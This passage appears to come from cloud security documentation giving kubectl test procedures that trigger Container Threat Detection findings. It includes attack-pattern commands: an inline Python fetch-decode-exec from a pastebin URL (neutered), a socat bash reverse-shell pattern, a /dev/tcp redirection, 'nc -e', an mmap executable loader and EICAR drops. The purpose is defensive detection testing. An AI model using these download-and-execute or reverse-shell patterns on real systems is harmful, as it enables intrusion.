           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c "
                 apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1;
                 echo '$b64_payload' | base64 -d > /etc/issue;
                 chmod 700 /etc/issue;
                 cat << 'EOF' > /tmp/loader.c
           #include <fcntl.h>
           #include <sys/mman.h>
           #include <sys/stat.h>
           #include <unistd.h>
           #include <stdlib.h>
           int main(int argc, char *argv[]) {
              int fd = open(argv[1], O_RDONLY);
              if (fd == -1) return 1;
              struct stat sb;
              if (fstat(fd, &sb) == -1) return 1;
              void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
              if (addr == MAP_FAILED) return 1;
              write(1, addr, sb.st_size);
              munmap(addr, sb.st_size);
              close(fd);
              return 0;
           }
           EOF
                 gcc /tmp/loader.c -o /tmp/loader;
                 /tmp/loader /etc/issue;
                 sha256sum /etc/issue;
                 sleep 10"
           

     * ARM node:
           
           b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
           tag="ktd-test-mmap-loader-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- sh -c "
                 apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1;
                 echo '$b64_payload' | base64 -d > /etc/issue;
                 chmod 700 /etc/issue;
                 cat << 'EOF' > /tmp/loader.c
           #include <fcntl.h>
           #include <sys/mman.h>
           #include <sys/stat.h>
           #include <unistd.h>
           #include <stdlib.h>
           int main(int argc, char *argv[]) {
              int fd = open(argv[1], O_RDONLY);
              if (fd == -1) return 1;
              struct stat sb;
              if (fstat(fd, &sb) == -1) return 1;
              void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
              if (addr == MAP_FAILED) return 1;
              write(1, addr, sb.st_size);
              munmap(addr, sb.st_size);
              close(fd);
              return 0;
           }
           EOF
                 gcc /tmp/loader.c -o /tmp/loader;
                 /tmp/loader /etc/issue;
                 sha256sum /etc/issue;
                 sleep 10"
           




This test procedure creates an `Execution: Modified Malicious Skill Loaded` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Container Escape

To trigger an Execution: Container Escape finding, place a binary in your container and execute it. This example deploys the latest Ubuntu 24.04 image, copies `/bin/ls` to another location, renames it to a suspicious tool (`botb-linux-amd64`), and executes it with additional arguments. This action is considered suspicious because this execution simulates behavior consistent with a container escape attempt.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Drop a Container Exploitation tool binary like `botb-linux-amd64` and execute it:

     * x86 node:
           
           tag="ktd-test-container-escape-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/botb-linux-amd64; /tmp/botb-linux-amd64 -autopwn"
           

     * ARM node:
           
           tag="ktd-test-container-escape-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/botb-linux-arm64; /tmp/botb-linux-arm64 -autopwn"
           




This test procedure creates an Execution: Container Escape finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Fileless Execution in `/memfd:`

To trigger an `Execution: Fileless Execution in /memfd:` finding, a process must be executed from the `/memfd:` in-memory file system. This example uses the latest Python image. The `/bin/ls` utility is copied to an anonymous file in `/memfd:`. This copied binary is then executed. The execution of a binary under `/memfd:` is flagged as suspicious because it mimics the behavior of an object trying to execute in memory to avoid file-based detections.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Create a privileged container and open bash to execute commands:

     * x86 node:
           
           tag="ktd-test-malicious-python-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true  -i \
              --image python:latest \
              "$tag" -- python -c "import os,sys,time
           
           time.sleep(10)
           f = open('/bin/ls','rb')
           execdata = f.read()
           f.close()
           fd = os.memfd_create('', 0)
           fname = '/proc/self/fd/{}'.format(fd)
           f = open(fname,'wb')
           f.write(execdata)
           f.close()
           args = ['/bin']
           os.execve(fname, args, os.environ)"
           

     * ARM node:
           
           tag="ktd-test-malicious-python-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true  -i \
              --image python:3-buster \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- python -c "import os,sys,time
           
           time.sleep(10)
           f = open('/bin/ls','rb')
           execdata = f.read()
           f.close()
           fd = os.memfd_create('', 0)
           fname = '/proc/self/fd/{}'.format(fd)
           f = open(fname,'wb')
           f.write(execdata)
           f.close()
           args = ['/bin']
           os.execve(fname, args, os.environ)"
           




This test procedure creates an `Execution: Fileless Execution in /memfd:` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Ingress Nightmare Vulnerability Execution

To trigger an Execution: Ingress Nightmare Vulnerability Execution ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, execute the nginx binary in your container. This example deploys the latest Ubuntu 24.04 image, copies `/bin/ls` to another location, renames it to an Nginx binary (`nginx`), and executes it with additional arguments referencing the `/proc` file system. This action is deemed suspicious because it simulates behavior consistent with the Ingress Nightmare exploit ([CVE-2025-1974](https://nvd.nist.gov/vuln/detail/CVE-2025-1974)), thereby indicating potential remote code execution.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Create an Nginx binary like `nginx` and execute it while accessing the `/proc` file system:

     * x86 node:
           
           tag="ktd-test-ingress-nightmare-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/nginx; /tmp/nginx /proc/1/fd/1"
           

     * ARM node:
           
           tag="ktd-test-ingress-nightmare-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/nginx; /tmp/nginx /proc/1/fd/1"
           




This test procedure creates an Execution: Ingress Nightmare Vulnerability Execution finding that you can view in Security Command Center and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center

## Execution: Kubernetes Attack Tool Execution

To trigger an Execution: Kubernetes Attack Tool Execution finding, place a binary in your container and execute it. This example deploys the latest Ubuntu 24.04 image, copies `/bin/ls` to another location, renames it to a suspicious tool (`amicontained`), and executes it. This action is considered suspicious because it simulates behavior consistent with a potential Kubernetes attack tool execution attempt.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Drop a Kubernetes Attack tool binary like `amicontained` and execute it:

     * x86 node:
           
           tag="ktd-test-kubernetes-attack-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/amicontained; /tmp/amicontained"
           

     * ARM node:
           
           tag="ktd-test-kubernetes-attack-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/amicontained; /tmp/amicontained"
           




This test procedure creates an Execution: Kubernetes Attack Tool Execution finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Local Reconnaissance Tool Execution

To trigger an `Execution: Local Reconnaissance Tool Execution` finding, place a binary in your container and execute it. This example deploys the latest Ubuntu 24.04 image, copies `/bin/ls` to another location, renames it to a suspicious tool (`linenum.sh`), and executes it. This action is considered suspicious because executing the renamed binary simulates behavior consistent with a local reconnaissance attempt.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Introduce a Local Reconnaissance tool binary like `linenum.sh` and execute it:

     * x86 node:
           
           tag="ktd-test-local-reconn-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/linenum.sh; /tmp/linenum.sh"
           

     * ARM node:
           
           tag="ktd-test-local-reconn-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/linenum.sh; /tmp/linenum.sh"
           




This test procedure creates an Execution: Local Reconnaissance Tool Execution finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Malicious Python Executed

**Preview**

This feature is subject to the "Pre-GA Offerings Terms" in the General Service Terms section of the [Service Specific Terms](https://docs.cloud.google.com/terms/service-terms#1). Pre-GA features are available "as is" and might have limited support. For more information, see the [launch stage descriptions](https://cloud.google.com/products/#product-launch-stages). 

To trigger an Execution: Malicious Python Executed finding, you can execute Python in the following procedure in your container.

The procedure deploys the latest Python image, copies Python code that appears malicious, and then executes it. To trigger a detection, the Python code must appear malicious to the detector.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute the following script in a new container.

This Python code originated from a [honeypot](https://en.wikipedia.org/wiki/Honeypot_\(computing\)). However, it was modified so that it does not execute the malicious binary. Running the script won't cause malicious activity in your container. The binary at the referenced URL does not exist and attempting to follow the URL results in a 404 error. This is expected. The _attempt_ to download, decode, and execute a binary using an inline script is what triggers the detection.

     * x86 node:
           
           tag="ktd-test-malicious-python-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true  -i \
              --image marketplace.gcr.io/google/python:latest \
              "$tag" -- python -c "import urllib
           import base64
           import os
           
           url = 'https://pastebin.com/raw/Z'
           page = base64.b64decode(urllib.urlopen(url).read())
           page = ''
           f = os.popen(str(page))
           url = 'https://pastebin.com/raw/Z'
           d = 'https://pastebin.com/raw/Z'
           page = base64.b64decode(urllib.urlopen(url).read())
           page = ''
           exec(page)"
           

     * ARM node:
           
           tag="ktd-test-malicious-python-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true  -i \
              --image python:3-buster \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- python -c "import urllib
           import base64
           import os
           
           url = 'https://pastebin.com/raw/Z'
           page = base64.b64decode(urllib.urlopen(url).read())
           page = ''
           f = os.popen(str(page))
           url = 'https://pastebin.com/raw/Z'
           d = 'https://pastebin.com/raw/Z'
           page = base64.b64decode(urllib.urlopen(url).read())
           page = ''
           exec(page)"
           




This test procedure creates an Execution: Malicious Python Executed finding that you can view in Security Command Center and in Cloud Logging if you configured logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

For noise reduction, when you first create a container, Container Threat Detection temporarily filters out Execution: Malicious Python Executed findings. To see all Execution: Malicious Python Executed findings while setting up a container, prefix your container name or Pod name with `ktd-test`, as in the example.

## Execution: Modified Malicious Binary Executed

To trigger an Execution: Modified Malicious Binary Executed finding, modify a malicious binary in your container and execute it. This example deploys the latest Ubuntu 24.04 image, modifies `/etc/issue` to an [EICAR](https://en.wikipedia.org/wiki/EICAR_test_file) testing malicious file, and then executes it. The binary's execution is unexpected because the created `/etc/issue` is modified during container runtime as an EICAR testing malicious binary, and the EICAR binary is a known malicious file according to the threat intelligence.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Drop the EICAR binary and execute it:

     * x86 node:
           
           tag="ktd-test-modified-malicious-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c "echo -n '$eicar' > /etc/issue; chmod 700 /etc/issue; /etc/issue; sleep 10"
           

     * ARM node:
           
           tag="ktd-test-modified-malicious-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- sh -c "echo -n '$eicar' > /etc/issue; chmod 700 /etc/issue; /etc/issue; sleep 10"
           




This test procedure creates an Execution: Modified Malicious Binary Executed finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Modified Malicious Library Loaded

To trigger an Execution: Modified Malicious Library Loaded finding, modify an existing file with a malicious library in your container and load it. This example deploys the latest Ubuntu 24.04 image, updates the `/etc/issue` file with a simulated malicious library, and then loads it using `mmap`. The library loading of an existing file is unexpected because the library is an [EICAR](https://en.wikipedia.org/wiki/EICAR_test_file) test file, which is classified as malicious by threat intelligence.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Add the EICAR file and load it:

     * x86 node:
           
           tag="ktd-test-modified-malicious-library-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c "
                 apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1;
                 echo -n '$eicar' > /etc/issue;
                 cat << 'EOF' > /tmp/loader.c
           #include <fcntl.h>
           #include <sys/mman.h>
           #include <sys/stat.h>
           #include <unistd.h>
           #include <stdlib.h>
           int main(int argc, char *argv[]) {
              int fd = open(argv[1], O_RDONLY);
              if (fd == -1) return 1;
              struct stat sb;
              if (fstat(fd, &sb) == -1) return 1;
              void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
              if (addr == MAP_FAILED) return 1;
              write(1, addr, sb.st_size);
              munmap(addr, sb.st_size);
              close(fd);
              return 0;
           }
           EOF
                 gcc /tmp/loader.c -o /tmp/loader && /tmp/loader /etc/issue
                 sleep 10"
           

     * ARM node:
           
           tag="ktd-test-modified-malicious-library-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
           "$tag" -- sh -c "
                 apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1;
                 echo -n '$eicar' > /etc/issue;
                 cat << 'EOF' > /tmp/loader.c
           #include <fcntl.h>
           #include <sys/mman.h>
           #include <sys/stat.h>
           #include <unistd.h>
           #include <stdlib.h>
           int main(int argc, char *argv[]) {
              int fd = open(argv[1], O_RDONLY);
              if (fd == -1) return 1;
              struct stat sb;
              if (fstat(fd, &sb) == -1) return 1;
              void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
              if (addr == MAP_FAILED) return 1;
              write(1, addr, sb.st_size);
              munmap(addr, sb.st_size);
              close(fd);
              return 0;
           }
           EOF
                 gcc /tmp/loader.c -o /tmp/loader && /tmp/loader /etc/issue
                 sleep 10"
           




This test procedure creates an Execution: Modified Malicious Library Loaded finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Netcat Remote Code Execution In Container

To trigger an `Execution: Netcat Remote Code Execution In Container` event, a binary capable of network communication (like netcat itself, or a renamed copy of another utility) needs to be present and executed inside the container. This example deploys the latest Ubuntu 24.04 image as a base. It copies the `/bin/ls` binary and renames that copy to `nc` (a network utility). This renamed binary is then executed with arguments appropriate for network interaction. This activity is flagged as suspicious because it mimics the behavior often observed during actual remote code execution attempts within containerized environments.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Introduce a network communication tool binary like `nc` and execute it with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-netcat-remote-code-exec-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/nc; /tmp/nc -e"
           

     * ARM node:
           
           tag="ktd-test-netcat-remote-code-exec-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/nc; /tmp/nc -e"
           




This test procedure creates an `Execution: Netcat Remote Code Execution In Container` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Possible Arbitrary Command Execution through CUPS (CVE-2024-47076)

To trigger an `Execution: Possible Arbitrary Command Execution through CUPS (CVE-2024-47076)` finding, the execution of a shell process by the `foomatic-rip` must take place. This example uses the latest Ubuntu 24.04 image. It copies `/bin/bash` to `/tmp/foomatic-rip`. This renamed and copied binary is ran as a shell script to create a child shell command. This behavior is flagged as suspicious because it can indicate an attempt to execute arbitrary workloads on compromised systems.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute the command with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-cups-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
              'cp /bin/bash /tmp/foomatic-rip; echo "#!/tmp/foomatic-rip" >> /tmp/test.sh; echo "sh -c echo hello" >> /tmp/test.sh; chmod +x /tmp/test.sh; /tmp/test.sh; sleep 10'
           

     * ARM node:
           
           tag="ktd-test-cups-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
              'cp /bin/bash /tmp/foomatic-rip; echo "#!/tmp/foomatic-rip" >> /tmp/test.sh; echo "sh -c echo hello" >> /tmp/test.sh; chmod +x /tmp/test.sh; /tmp/test.sh; sleep 10'
           




This test procedure creates an `Execution: Possible Arbitrary Command Execution through CUPS (CVE-2024-47076)` finding that you can view in Security Command Center and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Possible Remote Command Execution Detected

To trigger an `Execution: Possible Remote Command Execution Detected` ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, the execution of a command or binary commonly associated with remote command execution must be observed within a container. This example uses the latest Ubuntu 24.04 image. It copies `/bin/ls` and renames that to `touch` (or another tool like `find`). This renamed binary is then executed with arguments appropriate for remote command execution. This behavior is flagged as suspicious because it can indicate an attempt to establish unauthorized remote access to or from the container.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a binary like `touch` with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-remote-cmd-exec-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/touch; echo "Hello" | /tmp/touch >& /dev/tcp/8.8.8.8/53"
           

     * ARM node:
           
           tag="ktd-test-remote-cmd-exec-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/touch; echo "Hello" | /tmp/touch >& /dev/tcp/8.8.8.8/53"
           




This test procedure creates an `Execution: Possible Remote Command Execution Detected` finding that you can view in Security Command Center and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Program Run with Disallowed HTTP Proxy Env

To trigger an `Execution: Program Run with Disallowed HTTP Proxy Env` finding, execute a program within a container, setting an HTTP proxy environment variable to a disallowed value. This example uses the latest Ubuntu 24.04 image. The `/bin/ls` utility is copied and renamed to `/tmp/curl`. This renamed binary is then executed with a disallowed value set for an HTTP proxy environment variable (for example, `HTTP_PROXY`, `http_proxy`). The combination of program execution and the presence of a disallowed HTTP proxy environment is flagged as suspicious, as it suggests an attempt to communicate through an unauthorized proxy.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a network-capable binary, like `curl`, and execute it with a disallowed HTTP proxy environment variable:

     * x86 node:
           
           tag="ktd-test-program-with-http-proxy-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/curl; HTTP_PROXY=127.0.0.1:8080 /tmp/curl"
           

     * ARM node:
           
           tag="ktd-test-program-with-http-proxy-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/curl; HTTP_PROXY=127.0.0.1:8080 /tmp/curl"
           




This test procedure creates an `Execution: Program Run with Disallowed HTTP Proxy Env` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Socat Reverse Shell Detected

To trigger an `Execution: Socat Reverse Shell Detected` finding, a process reverse shell connection must be established by the `socat` utility. This example uses the latest Ubuntu 24.04 image. The `socat` utility is installed and a local tcp listener is created and then bound to by the socat utility. The reverse shell created by `socat` is flagged as suspicious because it allows an attacker to run arbitrary workloads on the system.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Create a container and execute the `socat` utility:

     * x86 node:
           
           tag="ktd-test-socat-reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "apt-get update && apt-get install socat -y && (socat UNIX-LISTEN:/tmp/shell.sock STDOUT &) && sleep 2 && timeout 5s socat UNIX-CONNECT:/tmp/shell.sock EXEC:/bin/bash,pty,stderr,setsid,sigint,sane || true"
           

     * ARM node:
           
           tag="ktd-test-socat-reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "apt-get update && apt-get install socat -y && (socat UNIX-LISTEN:/tmp/shell.sock STDOUT &) && sleep 2 && timeout 5s socat UNIX-CONNECT:/tmp/shell.sock EXEC:/bin/bash,pty,stderr,setsid,sigint,sane || true"
           




This test procedure creates an `Execution: Socat Reverse Shell Detected` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Suspicious Cron Modification ([Preview](https://cloud.google.com/products/#product-launch-stages))

To trigger a Suspicious Cron Modification detection, modify the host's `/etc/crontab` file from a container. This example deploys the latest Ubuntu 24.04 image, mounting the host's root file system into the container. It then updates the crontab file.

